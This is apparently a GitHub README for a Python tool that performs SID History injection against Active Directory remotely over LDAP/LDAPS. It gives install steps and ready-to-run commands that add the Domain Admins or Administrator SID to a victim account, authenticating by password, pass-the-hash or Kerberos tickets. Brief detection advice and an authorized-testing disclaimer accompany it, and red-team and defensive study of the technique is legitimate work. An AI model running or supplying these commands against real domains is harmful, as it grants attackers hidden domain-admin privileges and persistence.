# SID History Attack Tool

Remote SID History manipulation for Active Directory from Linux hosts via LDAP/LDAPS.

## Why This Tool?

Traditional SID History attacks require local access to Windows DCs (Mimikatz, DSInternals). This tool performs the attack **remotely from Linux** using LDAP protocols.

**Theory**: SID History allows objects to retain SIDs during domain migrations. Attackers abuse this by injecting privileged SIDs into controlled users, granting elevated rights without group membership.

## Features

**Attack Capabilities**
- Inject privileged SIDs into user accounts
- Query/lookup SIDs and SID History
- Remove or clear SID History entries
- Full LDAP/LDAPS support

**Authentication Methods**
- NTLM with password
- Pass-the-Hash (PTH)
- Kerberos (with tickets/ccache)
- Pass-the-Certificate (PTC)

**Code Quality**
- Modular architecture (easy debugging)
- Type hints & comprehensive error handling
- Clean separation: auth, LDAP ops, SID utils, attack orchestration

## Installation

```bash
git clone https://github.com/felixbillieres/SIDHistory.git
cd SIDHistory
python3 -m venv venv && source venv/bin/activate
pip install -r requirements.txt
```

## Quick Start

```bash
# NTLM Authentication (password)
python3 sidhistory.py -d DOMAIN.COM -u admin -p Pass123 -dc 192.168.1.10 \
    --target-user victim --source-user "Domain Admins"

# Pass-the-Hash
python3 sidhistory.py -d DOMAIN.COM -u admin --ntlm-hash <NT_HASH> -dc 192.168.1.10 \
    --target-user victim --source-user Administrator

# Kerberos (with existing ticket)
python3 sidhistory.py -d DOMAIN.COM -dc 192.168.1.10 --kerberos \
    --dc-hostname dc01.domain.com --target-user victim --sid S-1-5-21-xxx-512

# Query SID History
python3 sidhistory.py -d DOMAIN.COM -u admin -p Pass123 -dc 192.168.1.10 \
    --query-user victim

# Clear SID History
python3 sidhistory.py -d DOMAIN.COM -u admin -p Pass123 -dc 192.168.1.10 \
    --target-user victim --clear
```

## Key Options

**Auth**: `-u/--username`, `-p/--password`, `--ntlm-hash`, `--kerberos`, `--certificate`  
**Actions**: `--target-user`, `--source-user`, `--sid`, `--query-user`, `--remove`, `--clear`  
**Connection**: `-d/--domain`, `-dc/--dc-ip`, `--use-ssl`, `--dc-hostname`

Run `python3 sidhistory.py -h` for full usage.

## Requirements

- **Privileges**: Domain Admin or write access to `sIDHistory` attribute
- **Dependencies**: Python 3.7+, ldap3 library
- **Network**: Direct access to DC (port 389/LDAP or 636/LDAPS)

## Detection & Defense

**Attackers**: Operations are logged in AD audit logs and may trigger alerts.  
**Defenders**: Monitor `sIDHistory` changes, restrict permissions, use ATA/MDI, audit privileged accounts.

## References

- [MITRE ATT&CK T1134.005](https://attack.mitre.org/techniques/T1134/005/)
- [The Hacker Recipes: SID History](https://www.thehacker.recipes/ad/persistence/sid-history)
- [Microsoft: sIDHistory Attribute](https://learn.microsoft.com/en-us/windows/win32/adschema/a-sidhistory)

## Author

**Félix Billières (Elliot Belt)**

## Legal

**For authorized security testing only.** This tool is provided as-is without warranty. Unauthorized access to computer systems is illegal. Use at your own risk on systems you have explicit permission to test.

